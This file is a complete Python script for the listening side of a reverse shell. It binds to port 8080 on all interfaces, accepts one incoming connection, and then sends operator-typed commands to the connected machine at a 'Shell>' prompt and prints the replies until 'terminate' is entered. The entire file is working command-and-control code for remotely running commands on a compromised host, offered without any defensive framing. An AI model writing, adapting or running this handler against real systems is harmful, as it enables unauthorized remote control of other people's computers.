import socket

def connect():
    ip = "0.0.0.0"
    port = 8080
    Mysocket = socket.socket()
    Mysocket.bind((ip, port))
    Mysocket.listen(1)
    print("="*60)
    print("[+] Listening for incoming TCP connection on port " + str(port))
    connection, address = Mysocket.accept()
    print("[+] Connection established from", address)
    print("="*60)

    while True:
        command = input("Shell> : ")
        if "terminate" in command:
            connection.send("terminate".encode())
            connection.close()
            break
        else:
            connection.send(command.encode())
            print(connection.recv(1024).decode())
            print("="*60)

def main():
    connect()

main()